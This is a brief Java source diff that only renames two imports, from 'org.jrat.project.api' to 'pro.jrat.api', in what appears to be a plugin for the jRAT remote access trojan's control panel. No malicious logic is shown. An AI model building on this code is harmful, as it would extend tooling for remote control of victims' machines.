@@ -30,8 +30,8 @@ import javax.swing.event.TreeSelectionListener;
 import javax.swing.tree.DefaultMutableTreeNode;
 import javax.swing.tree.DefaultTreeModel;
 
-import org.jrat.project.api.BaseControlPanel;
-import org.jrat.project.api.RATControlMenuEntry;
+import pro.jrat.api.BaseControlPanel;
+import pro.jrat.api.RATControlMenuEntry;
 
 import com.redpois0n.Constants;
 import com.redpois0n.Script;
